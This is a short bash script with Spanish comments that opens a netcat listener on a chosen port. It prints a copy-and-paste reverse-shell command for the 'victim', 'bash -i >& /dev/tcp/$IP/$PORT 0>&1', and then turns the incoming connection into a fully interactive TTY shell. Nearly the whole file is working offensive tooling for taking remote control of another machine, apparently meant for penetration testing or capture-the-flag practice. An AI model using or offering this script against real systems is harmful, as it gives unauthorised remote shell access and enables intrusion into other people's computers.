#!/bin/bash

# Comprobar si el usuario ha pasado el puerto
if [ -z "$1" ]; then
    echo -e "\n\e[1;31m[!] Error: No port specified.\e[0m"
    echo -e "\e[1;32mUsage:\e[0m $0 <port>"
    echo -e "\e[1;34mExample:\e[0m $0 4444\n"
    exit 1
fi

PORT=$1
IP=$(hostname -I | awk '{print $1}')

echo -e "\e[1;32m[+]\e[0m Starting Interactive TTY Listener on port \e[1;33m$PORT\e[0m..."
echo -e "\e[1;34m[+]\e[0m Target Command (Copy & Paste on Victim):"
echo -e "\e[1;37m    bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'\e[0m"
echo "------------------------------------------------------------"

# Ejecución del Listener Interactivo
stty raw -echo; (echo "stty cols $(tput cols) rows $(tput lines) 2>/dev/null; export TERM=xterm-256color; python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || /usr/bin/script -qc /bin/bash /dev/null"; cat) | nc -lvnp $PORT; stty sane
